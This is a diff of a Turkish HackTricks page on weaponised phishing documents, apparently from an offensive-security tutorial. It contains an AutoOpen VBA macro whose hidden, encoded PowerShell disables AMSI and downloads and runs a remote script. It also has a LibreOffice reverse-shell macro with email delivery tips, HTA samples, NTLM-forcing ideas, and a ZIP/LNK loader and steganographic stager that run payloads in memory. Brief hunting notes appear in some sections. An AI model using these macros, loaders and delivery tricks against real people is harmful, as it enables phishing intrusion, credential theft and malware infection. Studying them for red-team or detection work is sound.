@@ -1,40 +1,40 @@
-# Phishing Dosyaları ve Belgeleri
+# Phishing Dosyaları & Belgeleri
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Office Belgeleri
 
-Microsoft Word bir dosyayı açmadan önce dosya veri doğrulaması gerçekleştirir. Veri doğrulama, OfficeOpenXML standardına karşı veri yapısı tanımlaması şeklinde yapılır. Veri yapısı tanımlaması sırasında herhangi bir hata oluşursa, incelenen dosya açılmaz.
+Microsoft Word, bir dosyayı açmadan önce dosya verilerinin doğrulamasını yapar. Veri doğrulaması, OfficeOpenXML standardına göre veri yapısı tanımlaması şeklinde gerçekleştirilir. Veri yapısı tanımlaması sırasında herhangi bir hata oluşursa, incelenen dosya açılmayacaktır.
 
-Genellikle makro içeren Word dosyaları `.docm` uzantısını kullanır. Ancak, dosya uzantısını değiştirerek dosyanın adını değiştirmek ve yine de makro çalıştırma yeteneğini korumak mümkündür.\
-Örneğin, bir RTF dosyası tasarım gereği makroları desteklemez, ancak DOCM olarak adlandırılmış bir dosya RTF'ye yeniden adlandırıldığında Microsoft Word tarafından işlenecek ve makro çalıştırma yeteneğine sahip olacaktır.\
-Aynı iç yapılar ve mekanizmalar Microsoft Office Suite içindeki tüm yazılımlar için geçerlidir (Excel, PowerPoint vb.).
+Makro içeren Word dosyaları genellikle `.docm` uzantısını kullanır. Ancak, dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve makro çalıştırma yeteneklerini korumak mümkündür.\
+Örneğin, RTF dosyası tasarım gereği makroları desteklemez, ancak bir DOCM dosyası RTF olarak yeniden adlandırılırsa Microsoft Word tarafından işlenecek ve makro çalıştırma yeteneğine sahip olacaktır.\
+Aynı iç yapılar ve mekanizmalar Microsoft Office Suite (Excel, PowerPoint etc.) içindeki tüm yazılımlar için geçerlidir.
 
-Aşağıdaki komutu, bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için kullanabilirsiniz:
+Bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-DOCX dosyaları, makroları içeren uzak bir şablona (File –Options –Add-ins –Manage: Templates –Go) referans veriyorsa, makroları “çalıştırabilir” da.
+Makrolar içeren ve uzak bir şablona referans veren DOCX dosyaları (File –Options –Add-ins –Manage: Templates –Go) makroları da “çalıştırabilir”.
 
 ### Harici Resim Yükleme
 
 Şuraya gidin: _Insert --> Quick Parts --> Field_\
-_**Kategoriler**: Bağlantılar ve Referanslar, **Alan adları**: includePicture, ve **Dosya adı veya URL**:_ http://<ip>/whatever
+_**Kategoriler**: Links and References, **Filed names**: includePicture, ve **Dosya adı veya URL**:_ http://<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
-### Macros Backdoor
+### Makro Arka Kapısı
 
-Belgeden rastgele kod çalıştırmak için makrolar kullanmak mümkündür.
+Belgeden rastgele kod çalıştırmak için makrolar kullanılabilir.
 
-#### Autoload functions
+#### Otomatik yükleme fonksiyonları
 
-Ne kadar yaygınlarsa, AV'nin bunları tespit etme olasılığı o kadar yüksektir.
+Ne kadar yaygınlarsa, AV tarafından tespit edilmeleri o kadar olasıdır.
 
 - AutoOpen()
 - Document_Open()
 
-#### Macros Kod Örnekleri
+#### Makro Kod Örnekleri
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -64,14 +64,14 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
-#### Meta verileri elle kaldırın
+#### Metaverileri elle kaldırın
 
-Belge Denetleyicisini açmak için **File > Info > Inspect Document > Inspect Document**'e gidin. Bu, Document Inspector'ı açacaktır. **Inspect**'e tıklayın ve ardından **Document Properties and Personal Information** yanında yer alan **Remove All**'ı seçin.
+Şuraya gidin: **File > Info > Inspect Document > Inspect Document**, bu Document Inspector'ı açacaktır. **Inspect**'e tıklayın ve ardından **Document Properties and Personal Information** bölümünün yanında **Remove All**'a tıklayın.
 
-#### Doc Uzantısı
+#### Doc Extension
 
-İşiniz bittiğinde, **Save as type** açılır menüsünü seçin ve formatı **`.docx`**'den **Word 97-2003 `.doc`**'e değiştirin.\
-Bunu yapın çünkü **can't save macro's inside a `.docx`** ve macro-etkin **`.docm`** uzantısının etrafında bir **stigma** vardır (ör. küçük resim simgesinde büyük bir `!` bulunur ve bazı web/email gateway'leri bunları tamamen engeller). Bu nedenle, bu **legacy `.doc` extension is the best compromise**.
+İşiniz bittiğinde, **Save as type** açılır menüsünden formatı **`.docx`**'den **Word 97-2003 `.doc`**'e değiştirin.\
+Bunu yapın çünkü **`.docx` içinde macro's kaydedemezsiniz** ve macro-enabled **`.docm`** uzantısı etrafında bir **stigma** vardır (ör. küçük resim simgesinde büyük bir `!` görünür ve bazı web/e-posta gateway'leri bunları tamamen engeller). Bu nedenle, **eski `.doc` uzantısı en iyi uzlaşıdır**.
 
 #### Malicious Macros Generators
 
@@ -79,11 +79,26 @@ Bunu yapın çünkü **can't save macro's inside a `.docx`** ve macro-etkin **`.
 - [**macphish**](https://github.com/cldrn/macphish)
 - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## HTA Dosyaları
+## LibreOffice ODT auto-run macros (Basic)
 
-Bir HTA, HTML ve VBScript ile JScript gibi scripting dillerini birleştiren bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve tarayıcı güvenlik modelinin kısıtlamaları olmadan "fully trusted" bir uygulama olarak çalışır.
+LibreOffice Writer belgeleri Basic macros gömebilir ve dosya açıldığında macro'yu **Open Document** olayına bağlayarak otomatik çalıştırabilir (Tools → Customize → Events → Open Document → Macro…). Basit bir reverse shell macro şöyle görünür:
+```vb
+Sub Shell
+Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
+End Sub
+```
+Dize içindeki çift tırnaklara (`""`) dikkat edin – LibreOffice Basic bunları literal tırnakları kaçışlamak için kullanır, bu yüzden `...==""")` ile biten payloads hem iç komutu hem de Shell argümanını dengede tutar.
 
-Bir HTA, **`mshta.exe`** kullanılarak çalıştırılır; bu genellikle **Internet Explorer** ile birlikte yüklendiğinden **`mshta`** IE'ye bağımlıdır. Bu nedenle Internet Explorer kaldırıldıysa, HTA'lar çalıştırılamaz.
+Teslimat ipuçları:
+
+- `.odt` olarak kaydedin ve makroyu belge olayına bağlayın, böylece açıldığında hemen tetiklenir.
+- `swaks` ile e‑posta gönderirken `--attach @resume.odt` kullanın (`@` gereklidir; böylece ek olarak dosya baytları, dosya adı dizgesi değil, gönderilir). Bu, doğrulama yapmadan rasgele `RCPT TO` alıcılarını kabul eden SMTP sunucularını kötüye kullanırken kritiktir.
+
+## HTA Files
+
+Bir HTA, **HTML ve scripting dillerini (ör. VBScript ve JScript) birleştiren** bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve bir tarayıcının güvenlik modelinin kısıtlamaları olmadan "tam güvenilir" bir uygulama olarak çalıştırılır.
+
+Bir HTA, **`mshta.exe`** kullanılarak çalıştırılır; bu araç genellikle **Internet Explorer** ile birlikte **kurulur**, bu da **`mshta`'nın IE'ye bağımlı** olmasına neden olur. Dolayısıyla IE kaldırıldıysa, HTA'lar çalıştırılamaz.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -138,11 +153,11 @@ var_func
 self.close
 </script>
 ```
-## NTLM Kimlik Doğrulamasını Zorlamak
+## Forcing NTLM Authentication
 
-NTLM kimlik doğrulamasını **"uzaktan"** **zorlamanın** birkaç yolu vardır; örneğin, kullanıcının erişeceği e-postalara veya HTML'ye **görünmez resimler** ekleyebilirsiniz (hatta HTTP MitM?). Veya kurbana **dosyaların adresini** gönderin; bu adresler **tetikleyecek** bir **kimlik doğrulamasını** yalnızca **klasörü açmak** için.
+There are several ways to **force NTLM authentication "remotely"**, for example, you could add **invisible images** to emails or HTML that the user will access (even HTTP MitM?). Or send the victim the **address of files** that will **trigger** an **authentication** just for **opening the folder.**
 
-**Aşağıdaki sayfalarda bu fikirleri ve daha fazlasını inceleyin:**
+**Check these ideas and more in the following pages:**
 
 
 {{#ref}}
@@ -156,24 +171,24 @@ NTLM kimlik doğrulamasını **"uzaktan"** **zorlamanın** birkaç yolu vardır;
 
 ### NTLM Relay
 
-Unutmayın, sadece hash'i veya kimlik doğrulamayı çalamazsınız, aynı zamanda **NTLM relay attacks** da gerçekleştirebilirsiniz:
+Sadece hash'i veya kimlik doğrulamasını çalmanın yanı sıra **perform NTLM relay attacks** da gerçekleştirebileceğinizi unutmayın:
 
 - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 ## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
 
-Çok etkili kampanyalar, iki meşru yem belge (PDF/DOCX) ve kötü amaçlı bir .lnk içeren bir ZIP teslim eder. Hile şu ki, gerçek PowerShell loader, ZIP'in ham baytları içinde benzersiz bir işaretçiden sonra saklanır ve .lnk bunu bellekte tamamen carve ederek çalıştırır.
+Oldukça etkili kampanyalar, içinde iki meşru tuzak belge (PDF/DOCX) ve kötü amaçlı bir .lnk bulunan bir ZIP teslim eder. Hile şu ki gerçek PowerShell loader, ZIP’in ham baytlarının içinde benzersiz bir işaretçiden sonra saklanır ve .lnk bunu bellekte parçalayıp tamamen çalıştırır.
 
-.lnk PowerShell one-liner tarafından uygulanan tipik akış:
+Typical flow implemented by the .lnk PowerShell one-liner:
 
-1) Orijinal ZIP'i şu yaygın yollar içinde bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve geçerli çalışma dizininin üst dizini.  
-2) ZIP baytlarını okuyun ve sabitlenmiş bir işaretçi bulun (ör., xFIQCV). İşaretçiden sonra gelen her şey gömülü PowerShell payload'dur.  
-3) ZIP'i %ProgramData% içine kopyalayın, orada çıkartın ve meşru görünmek için yem .docx'i açın.  
-4) Geçerli süreç için AMSI'yi bypass edin: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
-5) Bir sonraki aşamanın obfuskasyonunu kaldırın (ör., tüm # karakterlerini silin) ve bellekte çalıştırın.
+1) Orijinal ZIP'i yaygın dizinlerde ara: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, ve geçerli çalışma dizininin üst dizini.
+2) ZIP baytlarını oku ve sabit kodlanmış bir işaretçi bul (ör. xFIQCV). İşaretçiden sonraki her şey gömülü PowerShell payload'ıdır.
+3) ZIP'i %ProgramData% içine kopyala, orada aç ve meşru görünmesi için tuzak .docx'i aç.
+4) Mevcut süreç için AMSI'yi atla: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
+5) Sonraki aşamayı deobfuske et (ör. tüm # karakterlerini kaldır) ve bellekte çalıştır.
 
-Gömülü aşamayı carve edip çalıştırmak için örnek PowerShell iskeleti:
+Example PowerShell skeleton to carve and run the embedded stage:
 ```powershell
 $marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
 $paths    = @(
@@ -191,39 +206,39 @@ $code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
 Invoke-Expression $code
 ```
 Notlar
-- Gönderim genellikle itibarlı PaaS alt alan adlarını (ör. *.herokuapp.com) kötüye kullanır ve yükleri kısıtlayabilir (IP/UA'ya göre zararsız ZIP'ler sunar).
-- Bir sonraki aşama sıklıkla base64/XOR shellcode'u dekripte eder ve disk artefaktlarını azaltmak için Reflection.Emit + VirtualAlloc ile çalıştırır.
+- Teslimatlar sıklıkla tanınmış PaaS alt alan adlarını kötüye kullanır (ör. *.herokuapp.com) ve yükleri IP/UA'ya göre sınırlayabilir (zararsız ZIP'ler sunabilir).
+- Bir sonraki aşama genellikle base64/XOR shellcode'u çözer ve disk izlerini azaltmak için Reflection.Emit + VirtualAlloc ile çalıştırır.
 
-Persistence kullanılan aynı zincirde
-- COM TypeLib hijacking of the Microsoft Web Browser control, böylece IE/Explorer veya onu embed eden herhangi bir uygulama payload'u otomatik olarak yeniden başlatır. Ayrıntılar ve kullanıma hazır komutlar için burada bakınız:
+Aynı zincirde kullanılan persistence
+- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. Ayrıntılar ve kullanıma hazır komutlar için bakınız:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
 Hunting/IOCs
-- Arşiv verisine eklenmiş ASCII belirteç dizisini (ör. xFIQCV gibi) içeren ZIP dosyaları.
-- .lnk — ZIP'i bulmak için üst/kullanıcı klasörlerini tarayan ve bir decoy document açan dosyalar.
-- AMSI'ye [System.Management.Automation.AmsiUtils]::amsiInitFailed aracılığıyla müdahale.
-- Güvenilir PaaS domainlerinde barındırılan linklerle sonlanan uzun süre çalışan business thread'leri.
+- Arşiv verisine eklenmiş ASCII işaretçi dizisini (ör. xFIQCV) içeren ZIP dosyaları.
+- ZIP'i bulmak için üst/kullanıcı klasörlerini listeleyen ve bir aldatıcı belge açan .lnk.
+- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
+- Güvenilir PaaS alan adları altında barındırılan linklerle biten uzun süre çalışan iş parçacıkları.
 
-## Görüntülerde steganography-delimited payloads (PowerShell stager)
+## Steganography-delimited payloads in images (PowerShell stager)
 
-Son loader zincirleri, Base64 PowerShell stager'ı deşifre edip çalıştıran obfuskasyonlu bir JavaScript/VBS bırakıyor. Bu stager, benzersiz başlangıç/bitiş marker'ları arasına düz metin olarak gizlenmiş Base64-encoded .NET DLL içeren bir görüntü (çoğunlukla GIF) indirir. Script bu delimitörleri arar (sahada görülen örnekler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki metni çıkarır, Base64'ü byte'lara deşifre eder, assembly'i bellekte yükler ve C2 URL ile bilinen bir giriş metodunu çağırır.
+Son loader zincirleri, obfuskeli bir JavaScript/VBS teslim eder; bu, gömülü Base64 PowerShell stager'ı çözer ve çalıştırır. Bu stager genellikle GIF olan bir görüntü indirir; bu görüntü, benzersiz başlangıç/bitiş işaretleri arasında düz metin olarak gizlenmiş Base64-encoded .NET DLL içerir. Script bu delimitörleri arar (vahşi örneklerde görülen işaretler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki metni çıkarır, Base64 çözümler (byte'lara), assembly'yi belleğe yükler ve bilinen bir giriş metodunu C2 URL'si ile çağırır.
 
 İş akışı
-- Aşama 1: Arşivlenmiş JS/VBS dropper → gömülü Base64'ü deşifre eder → PowerShell stager'ı -nop -w hidden -ep bypass ile başlatır.
-- Aşama 2: PowerShell stager → görüntüyü indirir, marker-ile sınırlanmış Base64'i carve eder, .NET DLL'i bellekte yükler ve ör. VAI metodunu C2 URL ve seçeneklerle çağırır.
-- Aşama 3: Loader final payload'u alır ve tipik olarak process hollowing ile güvenilir bir binary'e (genellikle MSBuild.exe) enjekte eder. Process hollowing ve trusted utility proxy execution hakkında daha fazlası için bakınız:
+- Stage 1: Archived JS/VBS dropper → gömülü Base64'i çözer → PowerShell stager'ı -nop -w hidden -ep bypass ile başlatır.
+- Stage 2: PowerShell stager → görüntüyü indirir, işaretlerle sınırlanmış Base64'i ayrıştırır, .NET DLL'i belleğe yükler ve onun metodunu (ör. VAI) C2 URL'si ve seçeneklerle çağırır.
+- Stage 3: Loader nihai payload'u alır ve tipik olarak onu process hollowing ile güvenilir bir binary'ye (genellikle MSBuild.exe) inject eder. process hollowing ve trusted utility proxy execution hakkında daha fazla bilgi için bakınız:
 
 {{#ref}}
 ../../reversing/common-api-used-in-malware.md
 {{#endref}}
 
-Görüntüden bir DLL çıkarıp bir .NET metodunu bellekte çağırmak için PowerShell örneği:
+PowerShell örneği: bir görüntüden DLL çıkarmak ve .NET metodunu bellekte çağırmak için:
 
 <details>
-<summary>PowerShell stego payload çıkarıcı ve yükleyici</summary>
+<summary>PowerShell stego payload extractor and loader</summary>
 ```powershell
 # Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
 param(
@@ -248,11 +263,11 @@ $null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
 </details>
 
 Notlar
-- Bu, ATT&CK T1027.003 (steganography/marker-hiding) tekniğidir. Markörler kampanyalara göre değişir.
-- AMSI/ETW bypass ve string deobfuscation genellikle assembly'i yüklemeden önce uygulanır.
-- Hunting: indirilen görüntüleri bilinen delimiters için tarayın; PowerShell'in görüntülere erişip hemen Base64 blob'larını decode ettiğini tespit edin.
+- Bu ATT&CK T1027.003 (steganography/marker-hiding) örneğidir. Markörler kampanyadan kampanyaya değişir.
+- AMSI/ETW bypass and string deobfuscation genellikle assembly'yi yüklemeden önce uygulanır.
+- Avlama: indirilen görüntüleri bilinen ayırıcılar için tara; görüntülere erişen ve Base64 blob'larını hemen çözen PowerShell'i tespit et.
 
-See also stego tools and carving techniques:
+Ayrıca stego araçları ve carving tekniklerine bakın:
 
 {{#ref}}
 ../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
@@ -260,29 +275,30 @@ See also stego tools and carving techniques:
 
 ## JS/VBS droppers → Base64 PowerShell staging
 
-Yinelenen bir ilk aşama, arşiv içinde teslim edilen küçük, ağır şekilde obfuske edilmiş bir `.js` veya `.vbs` dosyasıdır. Tek amacı gömülü bir Base64 dizisini decode etmek ve sonraki aşamayı HTTPS üzerinden başlatmak için `-nop -w hidden -ep bypass` ile PowerShell'i çalıştırmaktır.
+Tekrarlayan bir ilk aşama, arşiv içinde teslim edilen küçük, yoğun şekilde obfusk edilmiş bir `.js` veya `.vbs` dosyasıdır. Tek amacı gömülü bir Base64 dizisini çözmek ve sonraki aşamayı HTTPS üzerinden başlatmak için `-nop -w hidden -ep bypass` ile PowerShell'i çalıştırmaktır.
 
-Skeleton logic (abstract):
+İskelet mantığı (soyut):
 - Kendi dosya içeriğini oku
-- Junk string'ler arasındaki Base64 blob'unu tespit et
-- ASCII PowerShell'e decode et
+- Çöp diziler arasındaki bir Base64 blob'unu bul
+- ASCII PowerShell'e dönüştür
 - `wscript.exe`/`cscript.exe` ile `powershell.exe`'i çağırarak çalıştır
 
-Hunting cues
-- Arşivlenmiş JS/VBS ekleri, komut satırında `-enc`/`FromBase64String` ile `powershell.exe` çalıştırıyorsa.
-- `wscript.exe`'in kullanıcı temp yollarından `powershell.exe -nop -w hidden` çalıştırması.
+Avlama ipuçları
+- Arşivlenmiş JS/VBS ekleri komut satırında `-enc`/`FromBase64String` ile `powershell.exe` başlatıyor.
+- `wscript.exe`, kullanıcı temp yollarından `powershell.exe -nop -w hidden` başlatıyor.
 
-## NTLM hash'lerini çalmak için Windows dosyaları
+## Windows files to steal NTLM hashes
 
-İlgili sayfaya bakın: **places to steal NTLM creds**:
+Bakınız: **places to steal NTLM creds** sayfası:
 
 {{#ref}}
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
 
-## References
+## Kaynaklar
 
+- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
 - [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
 - [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
 - [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
